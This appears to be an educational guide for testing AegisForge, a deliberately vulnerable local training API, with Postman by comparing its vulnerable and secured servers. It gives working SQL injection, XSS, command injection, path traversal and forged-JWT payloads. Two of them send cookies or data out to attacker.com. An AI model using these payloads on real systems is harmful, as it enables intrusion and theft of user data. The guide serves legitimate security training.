# AegisForge Postman Integration - Complete Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Understanding AegisForge Architecture](#understanding-aegisforge-architecture)
3. [Quick Start Setup](#quick-start-setup)
4. [Red Team vs Blue Team Testing](#red-team-vs-blue-team-testing)
5. [Importing AegisForge Collections](#importing-aegisforge-collections)
6. [Configuring Environments](#configuring-environments)
7. [Testing Red Team Endpoints](#testing-red-team-endpoints)
8. [Testing Blue Team Endpoints](#testing-blue-team-endpoints)
9. [Vulnerability Discovery Workflow](#vulnerability-discovery-workflow)
10. [Learning from the Differences](#learning-from-the-differences)
11. [Complete Testing Examples](#complete-testing-examples)
12. [Best Practices](#best-practices)
13. [Troubleshooting](#troubleshooting)
14. [Practice Exercises](#practice-exercises)

---

## Introduction

Welcome to the AegisForge Postman Integration Guide! This guide will teach you how to use Postman to interact with AegisForge's unique dual-server architecture designed specifically for learning cybersecurity.

### What is AegisForge?

AegisForge is an educational cybersecurity platform with a special feature: it runs **two identical APIs side by side**:

- **🔴 Red Team API (Port 5000)** - Intentionally vulnerable version
- **🔵 Blue Team API (Port 5001)** - Secured version with proper defenses

Think of it like having a car with working brakes (Blue Team) and one with broken brakes (Red Team) in a safe, controlled environment. You can learn what breaks look like without any real danger!

### Why This Approach is Powerful

**Traditional learning:** Read about vulnerabilities in textbooks  
**AegisForge approach:** Actually exploit vulnerabilities, then see how to fix them

You'll be able to:
1. **Attack the Red Team** - Find and exploit real vulnerabilities
2. **Compare with Blue Team** - See exactly how security measures prevent attacks
3. **Learn by doing** - Hands-on experience is 10x more valuable than reading
4. **Build your portfolio** - Document findings like a real security researcher

### What You'll Learn

By the end of this guide, you'll know how to:
- Set up Postman to connect to both AegisForge servers
- Test for common web vulnerabilities (SQL injection, XSS, BOLA, etc.)
- Understand the difference between vulnerable and secure code
- Document your findings like a professional penetration tester
- Build your own security testing workflows

### Prerequisites

Before starting, you should have:
- ✅ Postman installed (see `01_INSTALLATION_GUIDE.md`)
- ✅ Basic understanding of HTTP requests (see `02_POSTMAN_BASICS.md`)
- ✅ AegisForge running on your machine
- ✅ Basic understanding of APIs and JSON

**Time to complete:** 60-90 minutes for full guide  
**Difficulty level:** Beginner to Intermediate

---

## Understanding AegisForge Architecture

Before we dive into testing, let's understand how AegisForge is structured. This will help you know what you're testing and why.

### The Dual-Server Model

```
┌─────────────────────────────────────────────────┐
│              Your Computer                       │
│                                                  │
│  ┌──────────────────────────────────────────┐  │
│  │          Postman Application             │  │
│  │                                          │  │
│  │  Sends requests to both servers          │  │
│  └───────┬───────────────────┬──────────────┘  │
│          │                   │                  │
│          ▼                   ▼                  │
│  ┌───────────────┐   ┌───────────────┐        │
│  │  Red Team API │   │ Blue Team API │        │
│  │  Port 5000    │   │  Port 5001    │        │
│  │  ⚠️ Vulnerable │   │  ✅ Secure    │        │
│  └───────────────┘   └───────────────┘        │
│                                                  │
└─────────────────────────────────────────────────┘
```

### Why Two Servers?

**Imagine learning to swim:**
- Bad way: Reading a book about swimming
- Good way: Actually getting in water with a lifeguard

AegisForge is like having two pools:
1. **Red Team Pool** - No lifeguard, you can see what drowning looks like (safely)
2. **Blue Team Pool** - Professional lifeguards, safety equipment everywhere

You learn by comparing them!

### Understanding the Ports

**Port 5000 (Red Team):**
- Base URL: `http://localhost:5000`
- Contains 30+ intentional vulnerabilities
- Mimics real-world insecure applications
- Used for learning to find and exploit issues

**Port 5001 (Blue Team):**
- Base URL: `http://localhost:5001`
- Same functionality as Red Team
- All vulnerabilities fixed with best practices
- Shows you how security should be done

### Vulnerability Categories

AegisForge covers these major vulnerability categories (following OWASP Top 10):

1. **Injection Attacks** (SQL, Command, LDAP)
2. **Broken Authentication** (Weak passwords, session hijacking)
3. **Sensitive Data Exposure** (Unencrypted data, exposed secrets)
4. **XML External Entities (XXE)** (XML parsing vulnerabilities)
5. **Broken Access Control** (BOLA/IDOR, privilege escalation)
6. **Security Misconfiguration** (Default credentials, verbose errors)
7. **Cross-Site Scripting (XSS)** (Reflected, stored, DOM-based)
8. **Insecure Deserialization** (Arbitrary code execution)
9. **Using Components with Known Vulnerabilities**
10. **Insufficient Logging & Monitoring**

Don't worry if you don't know what these mean yet! We'll explain each one as we test them.

---

## Quick Start Setup

Let's get you up and running in the next 10 minutes!

### Step 1: Verify AegisForge is Running

First, make sure AegisForge is actually running on your computer.

**On Windows:**
```bash
# Open Command Prompt and run:
curl http://localhost:5000/api/health
curl http://localhost:5001/api/health
```

**On Mac/Linux:**
```bash
# Open Terminal and run:
curl http://localhost:5000/api/health
curl http://localhost:5001/api/health
```

**What you should see:**
```json
{
  "status": "healthy",
  "message": "Red Team API is running",
  "version": "2.0"
}
```

If you see "Connection refused" or "Could not connect," AegisForge isn't running. Go start it first!

**Starting AegisForge:**
```bash
# Navigate to the AegisForge directory
cd /path/to/aegisforge

# Install dependencies (first time only)
pip install -r requirements.txt

# Start Red Team API (Terminal 1)
python aegisforge_api.py

# Start Blue Team API (Terminal 2)  
python aegisforge_blue.py
```

You should see:
```
🔴 AegisForge RED TEAM API Starting...
⚠️  WARNING: Intentionally vulnerable endpoints for educational use only
Running on http://0.0.0.0:5000
```

### Step 2: Test Basic Connectivity in Postman

Now let's verify Postman can talk to AegisForge.

1. **Open Postman**

2. **Create a new request:**
   - Click the "+" button or "New" → "HTTP Request"
   - Name it "Health Check - Red Team"

3. **Configure the request:**
   - Method: `GET`
   - URL: `http://localhost:5000/api/health`

4. **Click "Send"**

**Screenshot description:** You should see a clean Postman interface with the request URL at the top, a bright blue "Send" button, and below that, a response section showing:
- Status: `200 OK` in green
- Time: Usually under 100ms
- Size: Around 100 B
- Body tab showing the JSON response

5. **Repeat for Blue Team:**
   - Create another request
   - URL: `http://localhost:5001/api/health`
   - Click "Send"

**Congratulations!** If both worked, you're connected to AegisForge! 🎉

### Step 3: Create Your Workspace

Let's organize your work properly.

1. **Create a new Collection:**
   - Click "Collections" in the left sidebar
   - Click the "+" or "Create Collection" button
   - Name it "AegisForge Security Testing"
   - Description: "Testing vulnerable and secure endpoints"

2. **Create folders inside:**
   - Right-click collection → "Add Folder"
   - Create these folders:
     - `01 - Authentication`
     - `02 - SQL Injection`
     - `03 - XSS Attacks`
     - `04 - Access Control`
     - `05 - Command Injection`
     - `06 - Comparison Tests`

**Screenshot description:** Your Collections sidebar should now show a tree structure with your main collection and six folders nested beneath it, each collapsed with a small arrow icon next to it.

---

## Red Team vs Blue Team Testing

Understanding the difference between testing vulnerable vs. secure endpoints is crucial. Let's break this down clearly.

### The Learning Philosophy

**Red Team Testing (Port 5000):**
- **Goal:** Find vulnerabilities, exploit them, understand how they work
- **Mindset:** Think like a hacker - "How can I break this?"
- **Success:** When you successfully exploit a vulnerability
- **Learning:** Understand what makes code vulnerable

**Blue Team Testing (Port 5001):**
- **Goal:** Verify security measures work, understand defensive techniques
- **Mindset:** Think like a defender - "How does this prevent attacks?"
- **Success:** When exploits fail and proper errors are returned
- **Learning:** Understand how to write secure code

### The Testing Workflow

```
1. Read vulnerability description
   ↓
2. Test Red Team endpoint (try to exploit)
   ↓
3. Document successful exploit
   ↓
4. Test Blue Team endpoint (same attack)
   ↓
5. Document how it was prevented
   ↓
6. Compare the two responses
   ↓
7. Understand the security lesson
```

### Example: SQL Injection Testing

Let's walk through a complete example to see the difference.

**Red Team Endpoint (Vulnerable):**
```
GET http://localhost:5000/api/injection/sqli/boolean?id=1 OR 1=1--
```

**What happens:**
- The API directly puts your input into a SQL query
- Your malicious input (`OR 1=1--`) bypasses the where clause
- You get ALL users instead of just one
- **The attack succeeded!** 🔴

**Response you'll see:**
```json
{
  "users": [
    {"id": 1, "name": "Alice", "email": "alice@test.com", "role": "user"},
    {"id": 2, "name": "Bob", "email": "bob@test.com", "role": "admin"},
    {"id": 3, "name": "Charlie", "email": "charlie@test.com", "role": "user"}
  ],
  "count": 3,
  "vulnerability": "SQL Injection successful! You retrieved all users."
}
```

**Blue Team Endpoint (Secure):**
```
GET http://localhost:5001/api/blue/injection/sqli/boolean?id=1 OR 1=1--
```

**What happens:**
- The API uses parameterized queries (prepared statements)
- Your malicious input is treated as literal data, not SQL code
- The query looks for a user with ID literally "1 OR 1=1--"
- No user exists with that ID, so you get nothing
- **The attack failed!** ✅

**Response you'll see:**
```json
{
  "error": "Invalid user ID format",
  "message": "User ID must be a valid integer",
  "received": "1 OR 1=1--",
  "security_note": "This endpoint uses parameterized queries to prevent SQL injection"
}
```

### Key Differences to Notice

When comparing responses, look for these patterns:

| Aspect | Red Team (Vulnerable) | Blue Team (Secure) |
|--------|----------------------|-------------------|
| **Input Validation** | Accepts anything | Validates and sanitizes |
| **Error Messages** | Detailed SQL errors | Generic error messages |
| **Data Access** | Can access unauthorized data | Strict access controls |
| **Response Format** | May include debug info | Clean, professional responses |
| **Security Headers** | Missing or weak | Strong security headers |

---

## Importing AegisForge Collections

AegisForge comes with pre-built Postman collections to help you get started quickly.

### Method 1: Import from File

1. **Locate the collection files** in AegisForge:
   - Navigate to `postman/collections/` folder
   - You'll find: `AegisForge_Complete_Collection.json`

2. **Import into Postman:**
   - Click "Import" button (top left in Postman)
   - Click "Upload Files"
   - Select the collection JSON file
   - Click "Import"

**Screenshot description:** The import dialog shows a file browser with "Upload Files" button prominently displayed. After selection, a preview shows the collection name and number of requests it contains (usually 50+).

3. **What you'll get:**
   - All vulnerability categories organized in folders
   - Pre-configured requests for both Red and Blue teams
   - Example test scripts and documentation
   - Ready-to-use environment variables

### Method 2: Import from Link

If you're following online tutorials, you might receive a link:

1. Click "Import" in Postman
2. Select "Link" tab
3. Paste the collection link
4. Click "Continue" → "Import"

### Exploring the Imported Collection

After importing, expand the collection to see:

```
📦 AegisForge Complete Collection
├── 📁 00 - Getting Started
│   ├── Health Check - Red Team
│   ├── Health Check - Blue Team
│   └── API Documentation
├── 📁 01 - SQL Injection
│   ├── Boolean-based SQLi - Red
│   ├── Boolean-based SQLi - Blue
│   ├── Union-based SQLi - Red
│   ├── Union-based SQLi - Blue
│   └── ...
├── 📁 02 - Authentication Attacks
├── 📁 03 - XSS (Cross-Site Scripting)
├── 📁 04 - Access Control (BOLA/IDOR)
└── ...and more!
```

Each request includes:
- **Description:** What vulnerability this tests
- **Pre-request Script:** Setup code if needed
- **Tests:** Automated checks for expected behavior
- **Documentation:** Learning notes about the vulnerability

---

## Configuring Environments

Environments in Postman let you switch between different setups quickly. For AegisForge, we'll create environments for both teams.

### Creating the Red Team Environment

1. **Click the "Environments" icon** (looks like an eye in the top-right)

2. **Click "Create Environment"**

3. **Name it:** `AegisForge - Red Team`

4. **Add these variables:**

| Variable Name | Initial Value | Current Value | Description |
|--------------|---------------|---------------|-------------|
| `baseUrl` | `http://localhost:5000` | `http://localhost:5000` | Red Team API base URL |
| `apiVersion` | `v1` | `v1` | API version |
| `authToken` | (leave empty) | (leave empty) | Will be set after login |
| `userId` | (leave empty) | (leave empty) | Test user ID |
| `teamType` | `red` | `red` | Which team we're testing |

**Screenshot description:** The environment editor shows a table with columns for Variable, Type, Initial Value, and Current Value. Each variable is on its own row with text input fields. At the top is the environment name with a red dot icon indicating it's the Red Team setup.

5. **Click "Save"**

### Creating the Blue Team Environment

1. **Create another environment:** `AegisForge - Blue Team`

2. **Add the same variables but change:**
   - `baseUrl`: `http://localhost:5001`
   - `teamType`: `blue`

### Using Variables in Requests

Now you can use these variables in any request:

**Instead of:**
```
GET http://localhost:5000/api/users/1
```

**Use:**
```
GET {{baseUrl}}/api/users/{{userId}}
```

**Why this is powerful:**
- Switch between Red and Blue team with one click
- Share collections with others (they just need to set their own environment)
- Easy to test different servers (local, staging, production)
- Keep sensitive data out of collection (tokens, passwords)

### Switching Environments

**To switch between Red and Blue Team:**
1. Look at top-right corner of Postman
2. Click the environment dropdown (currently says "No Environment")
3. Select "AegisForge - Red Team" or "AegisForge - Blue Team"

**Screenshot description:** A dropdown menu in the top-right shows a list of available environments with radio buttons. The selected environment has a checkmark and appears highlighted.

---

## Testing Red Team Endpoints

Now let's actually exploit some vulnerabilities! This is where learning gets fun.

### Authentication and Setup

Before testing most endpoints, you'll need to authenticate.

**Request 1: Register a Test User**

```
POST {{baseUrl}}/api/auth/register

Body (JSON):
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "password123",
  "role": "user"
}
```

**Expected Response:**
```json
{
  "message": "User registered successfully",
  "userId": 15,
  "vulnerability_note": "Red Team: Weak password accepted, no email verification"
}
```

**Save the userId** to environment:
```javascript
// Add to Tests tab:
pm.test("User registered", function() {
    pm.response.to.have.status(201);
    let userId = pm.response.json().userId;
    pm.environment.set("userId", userId);
});
```

**Request 2: Login**

```
POST {{baseUrl}}/api/auth/login

Body (JSON):
{
  "username": "testuser",
  "password": "password123"
}
```

**Expected Response:**
```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "userId": 15,
  "role": "user"
}
```

**Save the token:**
```javascript
// Tests tab:
pm.test("Login successful", function() {
    pm.response.to.have.status(200);
    let token = pm.response.json().token;
    pm.environment.set("authToken", token);
});
```

### SQL Injection Attacks

Let's find and exploit SQL injection vulnerabilities.

#### Boolean-Based SQL Injection

**What this is:** Manipulating SQL queries to reveal information based on TRUE/FALSE responses.

**Vulnerable Endpoint:**
```
GET {{baseUrl}}/api/injection/sqli/boolean?id=1
```

**Normal behavior:** Returns user with ID 1

**Exploit 1: Bypass authentication**
```
GET {{baseUrl}}/api/injection/sqli/boolean?id=1 OR 1=1--
```

**Why this works:**
The server builds SQL like: `SELECT * FROM users WHERE id = 1 OR 1=1--`
- `OR 1=1` is always true
- `--` comments out the rest of the query
- Result: You get ALL users!

**Exploit 2: Information extraction**
```
GET {{baseUrl}}/api/injection/sqli/boolean?id=1 AND (SELECT COUNT(*) FROM users) > 10--
```

This tells you if there are more than 10 users in the database!

**Testing script:**
```javascript
pm.test("SQL Injection successful", function() {
    let response = pm.response.json();
    
    // Should return multiple users when exploiting
    pm.expect(response.users).to.be.an('array');
    pm.expect(response.users.length).to.be.above(1);
    
    console.log(`Retrieved ${response.users.length} users via SQL injection`);
});
```

#### Union-Based SQL Injection

**What this is:** Using UNION to combine results from different queries.

**Exploit:**
```
GET {{baseUrl}}/api/injection/sqli/union?search=' UNION SELECT id, password, email FROM users--
```

**Why this is dangerous:** You can extract password hashes and other sensitive data!

**Response you might see:**
```json
{
  "products": [
    {"id": 1, "name": "user1@example.com", "description": "hashed_password_here"},
    {"id": 2, "name": "admin@example.com", "description": "admin_password_hash"}
  ]
}
```

Notice the password hashes appearing in the "products" results? That's the vulnerability!

### Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

#### Reflected XSS

**Vulnerable Endpoint:**
```
GET {{baseUrl}}/api/xss/reflected?name=<script>alert('XSS')</script>
```

**What happens:**
- Your script tag is directly reflected in the response
- If this were a website, the script would execute
- An attacker could steal cookies, redirect users, or more

**Red Team Response:**
```json
{
  "message": "Hello, <script>alert('XSS')</script>!",
  "vulnerability": "Script tags not sanitized"
}
```

**Testing for XSS:**
```javascript
pm.test("XSS vulnerability exists", function() {
    let response = pm.response.text();
    
    // Check if script tags are present in response
    pm.expect(response).to.include("<script>");
    pm.expect(response).to.include("</script>");
    
    console.log("XSS vulnerability confirmed: Script tags not filtered");
});
```

#### Stored XSS

**More dangerous** - The script is saved to database and affects all users who view it!

**Exploit:**
```
POST {{baseUrl}}/api/xss/stored

Body:
{
  "comment": "<script>document.location='http://attacker.com/?cookie='+document.cookie</script>",
  "postId": 1
}
```

This would steal every user's cookies who views this comment!

### Broken Object Level Authorization (BOLA/IDOR)

This is when you can access other users' data by simply changing an ID in the URL.

**Your user ID:** 15 (from registration)

**Exploit - Access another user's data:**
```
GET {{baseUrl}}/api/users/1
Authorization: Bearer {{authToken}}
```

**Red Team Response:**
```json
{
  "id": 1,
  "username": "admin",
  "email": "admin@aegisforge.com",
  "role": "admin",
  "apiKey": "secret-api-key-12345",
  "vulnerability": "BOLA: You accessed another user's data"
}
```

**Why this is critical:** You just accessed the admin's data, including their API key! In a real app, this could be devastating.

**Testing script:**
```javascript
pm.test("BOLA vulnerability exists", function() {
    let response = pm.response.json();
    let myUserId = pm.environment.get("userId");
    
    // We successfully accessed a different user's data
    pm.expect(response.id).to.not.equal(parseInt(myUserId));
    
    console.log(`Accessed user ${response.id}'s data despite being user ${myUserId}`);
});
```

### Command Injection

Attackers can execute system commands on the server.

**Vulnerable Endpoint:**
```
POST {{baseUrl}}/api/injection/command

Body:
{
  "filename": "test.txt; ls -la"
}
```

**What happens:**
- The server runs: `cat test.txt; ls -la`
- Instead of just reading a file, it also lists all files!
- Attacker could run: `; rm -rf /` to delete everything (don't actually do this!)

**Red Team Response:**
```json
{
  "output": "total 48\ndrwxr-xr-x 5 user user 4096 Jan 15 10:30 .\n...",
  "command_run": "cat test.txt; ls -la",
  "vulnerability": "Command injection successful"
}
```

### Path Traversal

Access files outside the intended directory.

**Exploit:**
```
GET {{baseUrl}}/api/file/read?filename=../../../../etc/passwd
```

**Why this works:**
- `../` means "go up one directory"
- String them together to escape the intended folder
- Access sensitive system files!

**Red Team Response:**
```json
{
  "content": "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\n...",
  "vulnerability": "Path traversal: Accessed /etc/passwd"
}
```

---

## Testing Blue Team Endpoints

Now let's see how the Blue Team defends against all these attacks!

### The Same SQL Injection - But Secure

**Blue Team Endpoint:**
```
GET {{baseUrl}}/api/blue/injection/sqli/boolean?id=1 OR 1=1--
```

**Blue Team Response:**
```json
{
  "error": "Invalid user ID",
  "details": "User ID must be a valid integer",
  "received": "1 OR 1=1--",
  "security_note": "Input validation prevents SQL injection. This endpoint uses parameterized queries."
}
```

**What changed:**
1. **Input validation** - Checks if ID is actually a number
2. **Parameterized queries** - SQL injection is impossible
3. **Proper error handling** - Doesn't reveal database structure

**Test script to verify security:**
```javascript
pm.test("SQL Injection prevented", function() {
    // Should return an error, not data
    pm.response.to.have.status(400);
    
    let response = pm.response.json();
    pm.expect(response).to.have.property('error');
    pm.expect(response).to.not.have.property('users');
    
    console.log("✅ SQL injection attack blocked successfully");
});
```

### The Same XSS - But Secure

**Blue Team Endpoint:**
```
GET {{baseUrl}}/api/blue/xss/reflected?name=<script>alert('XSS')</script>
```

**Blue Team Response:**
```json
{
  "message": "Hello, &lt;script&gt;alert('XSS')&lt;/script&gt;!",
  "security_note": "Input sanitized: HTML entities encoded"
}
```

**What changed:**
- `<script>` became `&lt;script&gt;` (HTML entity encoding)
- The script is now displayed as text, not executed
- Input sanitization prevents the attack

**Test script:**
```javascript
pm.test("XSS prevented", function() {
    let response = pm.response.text();
    
    // Script tags should be escaped
    pm.expect(response).to.include("&lt;script&gt;");
    pm.expect(response).to.not.include("<script>");
    
    console.log("✅ XSS attack neutralized via HTML encoding");
});
```

### The Same BOLA - But Secure

**Blue Team Endpoint:**
```
GET {{baseUrl}}/api/blue/users/1
Authorization: Bearer {{authToken}}
```

**Blue Team Response:**
```json
{
  "error": "Access denied",
  "message": "You can only access your own user data",
  "userId": 1,
  "requestedBy": 15,
  "security_note": "Authorization check enforced"
}
```

**What changed:**
- **Authorization check** - Verifies the user can only access their own data
- **Access control** - Compares token's user ID with requested user ID
- **Security logging** - Attack attempt is logged

### The Same Command Injection - But Secure

**Blue Team Endpoint:**
```
POST {{baseUrl}}/api/blue/injection/command

Body:
{
  "filename": "test.txt; ls -la"
}
```

**Blue Team Response:**
```json
{
  "error": "Invalid filename",
  "message": "Filename contains illegal characters",
  "security_note": "Input validation prevents command injection. Only alphanumeric and basic punctuation allowed."
}
```

**What changed:**
- **Whitelist validation** - Only safe characters allowed
- **No shell execution** - Uses safe APIs instead of system commands
- **Input sanitization** - Removes dangerous characters

---

## Vulnerability Discovery Workflow

Let's put it all together with a professional testing workflow.

### Step-by-Step Testing Process

**1. Reconnaissance Phase**

Start by understanding what the API offers:

```
GET {{baseUrl}}/api/documentation
```

This gives you a map of all endpoints. Think of it like casing a bank before robbing it (but ethically and legally!)

**Document what you find:**
- List all endpoints
- Note which require authentication
- Identify input parameters
- Look for interesting data fields

**2. Initial Testing Phase**

Test normal functionality first:

```
# Create a normal user
POST {{baseUrl}}/api/auth/register
# Login normally
POST {{baseUrl}}/api/auth/login  
# Access your own data
GET {{baseUrl}}/api/users/{{userId}}
```

**Why:** You need to understand normal behavior before testing abnormal.

**3. Vulnerability Scanning Phase**

Now systematically test for common vulnerabilities:

**SQL Injection checklist:**
- [ ] Test with `' OR 1=1--`
- [ ] Test with `' UNION SELECT...`
- [ ] Test with `'; DROP TABLE users--` (don't worry, AegisForge protects against this!)
- [ ] Test time-based: `'; WAITFOR DELAY '00:00:05'--`

**XSS checklist:**
- [ ] Test with `<script>alert(1)</script>`
- [ ] Test with `<img src=x onerror=alert(1)>`
- [ ] Test with event handlers: `<div onload=alert(1)>`
- [ ] Test in different parameters (URL, headers, body)

**Access Control checklist:**
- [ ] Try accessing other users' IDs
- [ ] Try changing your role to admin
- [ ] Test without authentication token
- [ ] Test with expired/invalid token

**4. Exploitation Phase**

When you find a vulnerability, see how far you can take it:

**Example: Chaining BOLA with Privilege Escalation**

```javascript
// Collection Pre-request Script
// First, exploit BOLA to get admin user data
pm.sendRequest({
    url: pm.environment.get("baseUrl") + "/api/users/1",
    method: 'GET',
    header: {
        'Authorization': 'Bearer ' + pm.environment.get("authToken")
    }
}, function(err, response) {
    if (!err) {
        let adminData = response.json();
        pm.environment.set("adminApiKey", adminData.apiKey);
        console.log("Got admin API key:", adminData.apiKey);
    }
});

// Then use admin key to access admin functions
setTimeout(() => {
    pm.sendRequest({
        url: pm.environment.get("baseUrl") + "/api/admin/users",
        method: 'GET',
        header: {
            'X-API-Key': pm.environment.get("adminApiKey")
        }
    }, function(err, response) {
        console.log("Admin data accessed:", response.json());
    });
}, 1000);
```

**5. Documentation Phase**

Document your findings like a professional:

```markdown
## Vulnerability Report: SQL Injection in User Search

**Severity:** Critical
**Endpoint:** GET /api/injection/sqli/boolean
**Team:** Red (Vulnerable)

### Description
The user search endpoint is vulnerable to boolean-based SQL injection, allowing an attacker to bypass authentication and retrieve all user records.

### Reproduction Steps
1. Navigate to: GET /api/injection/sqli/boolean?id=1 OR 1=1--
2. Observe that all users are returned instead of just user ID 1

### Impact
- Unauthorized access to all user data
- Potential data exfiltration
- Could lead to account takeover

### Evidence
[Screenshot or response data]

### Remediation
See Blue Team endpoint /api/blue/injection/sqli/boolean which uses:
- Input validation
- Parameterized queries
- Proper error handling
```

---

## Learning from the Differences

This is where real learning happens - comparing vulnerable vs. secure code.

### Side-by-Side Comparison

Let's create a comparison request in Postman:

**Create a new request: "SQL Injection Comparison"**

**Pre-request Script:**
```javascript
// Test both Red and Blue team
const redUrl = "http://localhost:5000";
const blueUrl = "http://localhost:5001";
const exploit = "1 OR 1=1--";

console.log("=== COMPARISON TEST: SQL Injection ===\n");

// Test Red Team
pm.sendRequest({
    url: `${redUrl}/api/injection/sqli/boolean?id=${exploit}`,
    method: 'GET'
}, function(err, response) {
    console.log("🔴 RED TEAM (Vulnerable):");
    console.log("Status:", response.code);
    console.log("Users returned:", response.json().users.length);
    console.log("Exploit worked:", response.json().users.length > 1);
    console.log("");
});

// Test Blue Team
pm.sendRequest({
    url: `${blueUrl}/api/blue/injection/sqli/boolean?id=${exploit}`,
    method: 'GET'
}, function(err, response) {
    console.log("🔵 BLUE TEAM (Secure):");
    console.log("Status:", response.code);
    console.log("Error returned:", response.json().error);
    console.log("Exploit blocked:", response.code === 400);
    console.log("");
    
    console.log("=== SECURITY LESSONS ===");
    console.log("1. Red Team: No input validation");
    console.log("2. Blue Team: Validates ID is integer");
    console.log("3. Red Team: String concatenation in SQL");
    console.log("4. Blue Team: Parameterized queries");
});
```

**Run this** and watch your Postman console. You'll see exactly how each team handles the same attack!

### Key Security Patterns to Learn

From comparing Red vs. Blue team, you'll learn these crucial patterns:

#### 1. Input Validation

**Red Team (Bad):**
```python
# Accepts anything
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id = {user_id}"
```

**Blue Team (Good):**
```python
# Validates input
user_id = request.args.get('id')
if not user_id.isdigit():
    return {"error": "Invalid user ID"}, 400
```

#### 2. Output Encoding

**Red Team (Bad):**
```python
# Returns raw data
return f"<div>Hello, {username}!</div>"
```

**Blue Team (Good):**
```python
# Encodes HTML entities
from html import escape
return f"<div>Hello, {escape(username)}!</div>"
```

#### 3. Authorization Checks

**Red Team (Bad):**
```python
# No verification
user = User.query.get(user_id)
return user.to_json()
```

**Blue Team (Good):**
```python
# Verifies ownership
user = User.query.get(user_id)
if user.id != current_user.id and not current_user.is_admin:
    return {"error": "Access denied"}, 403
return user.to_json()
```

#### 4. Error Handling

**Red Team (Bad):**
```python
# Detailed error messages
except Exception as e:
    return {"error": str(e), "query": sql_query}
```

**Blue Team (Good):**
```python
# Generic error messages
except Exception as e:
    logger.error(f"Database error: {e}")
    return {"error": "An error occurred"}, 500
```

---

## Complete Testing Examples

Let's work through complete, real-world testing scenarios.

### Example 1: Complete Authentication Bypass

**Scenario:** Test if you can bypass authentication and access admin functions.

**Test Collection:**

```javascript
// Request 1: Normal user registration
POST {{baseUrl}}/api/auth/register
Body: {
  "username": "hacker",
  "password": "test123",
  "role": "user"
}

// Tests:
pm.test("User created as regular user", function() {
    pm.expect(pm.response.json().role).to.equal("user");
});

// Request 2: Attempt privilege escalation
POST {{baseUrl}}/api/auth/register  
Body: {
  "username": "hacker2",
  "password": "test123",
  "role": "admin"  // Try to register as admin!
}

// Tests:
pm.test("Privilege escalation test", function() {
    let role = pm.response.json().role;
    if (role === "admin") {
        console.log("🔴 RED TEAM: Privilege escalation successful!");
    } else {
        console.log("🔵 BLUE TEAM: Privilege escalation prevented");
    }
});

// Request 3: JWT token manipulation
// Pre-request Script:
function base64urlEncode(str) {
    return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

let header = {alg: "none", typ: "JWT"};
let payload = {
    userId: 1,
    role: "admin",
    exp: Date.now() + 3600000
};

let fakeToken = base64urlEncode(JSON.stringify(header)) + "." +
                base64urlEncode(JSON.stringify(payload)) + ".";

pm.environment.set("fakeToken", fakeToken);

// Request:
GET {{baseUrl}}/api/admin/users
Authorization: Bearer {{fakeToken}}

// Tests:
pm.test("JWT bypass attempt", function() {
    if (pm.response.code === 200) {
        console.log("🔴 RED TEAM: JWT signature not verified!");
    } else {
        console.log("🔵 BLUE TEAM: Invalid JWT rejected");
    }
});
```

### Example 2: Data Exfiltration Chain

**Scenario:** Chain multiple vulnerabilities to extract sensitive data.

```javascript
// Step 1: Use SQL injection to find all usernames
GET {{baseUrl}}/api/injection/sqli/union?search=' UNION SELECT username, password, email FROM users--

// Save usernames:
pm.test("Extract usernames", function() {
    let users = pm.response.json().results;
    let usernames = users.map(u => u.name);
    pm.environment.set("targetUsernames", JSON.stringify(usernames));
    console.log("Found users:", usernames);
});

// Step 2: Use BOLA to access each user's private data
// Pre-request Script:
let usernames = JSON.parse(pm.environment.get("targetUsernames"));
let sensitiveData = [];

usernames.forEach((username, index) => {
    setTimeout(() => {
        pm.sendRequest({
            url: `${pm.environment.get("baseUrl")}/api/users/${index + 1}/profile`,
            method: 'GET',
            header: {
                'Authorization': 'Bearer ' + pm.environment.get("authToken")
            }
        }, function(err, response) {
            if (response.code === 200) {
                let data = response.json();
                console.log(`Accessed ${username}'s data:`, data);
                sensitiveData.push(data);
            }
        });
    }, index * 500);
});

// Step 3: Use Command Injection to save data to file
POST {{baseUrl}}/api/injection/command
Body: {
  "filename": "test.txt",
  "content": "Exfiltrated data",
  "command": "curl -X POST http://attacker.com/receive -d @exfiltrated.json"
}
```

### Example 3: XSS to Cookie Theft

**Scenario:** Demonstrate how XSS can steal session cookies.

```javascript
// Create malicious comment with XSS payload
POST {{baseUrl}}/api/xss/stored

Body: {
  "comment": "<img src=x onerror='fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)'>",
  "author": "Innocent User",
  "postId": 1
}

// Tests:
pm.test("Stored XSS test", function() {
    if (pm.response.code === 201) {
        console.log("🔴 RED TEAM: XSS payload stored!");
        console.log("When any user views this, their cookies will be stolen");
    } else {
        console.log("🔵 BLUE TEAM: XSS payload sanitized");
    }
});

// Retrieve the comment to see if payload is intact
GET {{baseUrl}}/api/posts/1/comments

// Tests:
pm.test("XSS payload check", function() {
    let comments = pm.response.json().comments;
    let maliciousComment = comments.find(c => c.author === "Innocent User");
    
    if (maliciousComment.comment.includes("<img src=x")) {
        console.log("🔴 XSS payload intact - would execute in browser");
    } else {
        console.log("🔵 XSS payload sanitized:", maliciousComment.comment);
    }
});
```

---

## Best Practices

### Testing Strategies

**1. Always test in pairs** - Red Team then Blue Team
```
For every vulnerability test:
1. Try to exploit on Red Team
2. Verify it fails on Blue Team
3. Document the difference
4. Understand WHY it was prevented
```

**2. Build your own exploit library**

Create a collection of common exploits you can reuse:
- SQL injection payloads
- XSS vectors
- Command injection strings
- Path traversal sequences

**3. Use Collection Variables for reusable data**

```javascript
// Set up once in collection
pm.collectionVariables.set("sqlPayloads", JSON.stringify([
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--",
    "' AND SLEEP(5)--"
]));

// Use in any request
let payloads = JSON.parse(pm.collectionVariables.get("sqlPayloads"));
```

**4. Automate comparison tests**

Create a "runner" request that tests both teams automatically:

```javascript
let tests = [
    {name: "SQL Injection", path: "/api/injection/sqli/boolean?id=1 OR 1=1--"},
    {name: "XSS", path: "/api/xss/reflected?name=<script>alert(1)</script>"},
    {name: "BOLA", path: "/api/users/1"}
];

tests.forEach(test => {
    // Test Red Team
